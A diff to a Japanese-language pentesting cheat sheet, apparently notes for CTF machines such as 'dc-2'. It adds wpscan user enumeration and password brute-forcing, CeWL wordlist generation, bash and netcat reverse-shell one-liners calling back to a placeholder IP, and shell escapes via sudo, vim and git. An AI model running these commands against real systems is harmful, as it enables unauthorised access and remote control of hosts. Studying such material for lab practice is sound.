@@ -59,6 +59,17 @@ Samba
  4. 自ユーザで書き込める・アクセスできるものは何か？
 
 
+wpscan
+
+   wpscan -e u --url http://dc-2/ 
+   wpscan --url http://dc-2/ -U ./ulist -P ./plist
+
+
+[CeWL: Custom Word List Generator](https://github.com/digininja/CeWL)
+
+    bundle install --path vendor/bundle
+    bundle exec ./cewl.rb http://XXX/ -w passlist
+
 
 ## Delivery
 
@@ -82,7 +93,9 @@ Spawning A TTY Shell
 [bashリバースシェル](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
     nc -lvp 9999
+
     ;bash -i >& /dev/tcp/ip/9999 0>&1
+    nc ip 9999 -e /bin/bash
 
 [exploitdb](https://github.com/offensive-security/exploitdb)
 
@@ -106,6 +119,21 @@ sqlmap
     select * from func;
     select sys_exec('usermod -a -G admin [user]');
 
+Bash
 
+    echo $PATH
+    export PATH=$PATH:/usr/bin
+
+    sudo -l
+
+Vi/Vim
+
+    :set shell=/bin/bash
+    :shell
+
+Git
+
+    git -p --help  #意図的にページャを開く
+    !/bin/sh
 
 
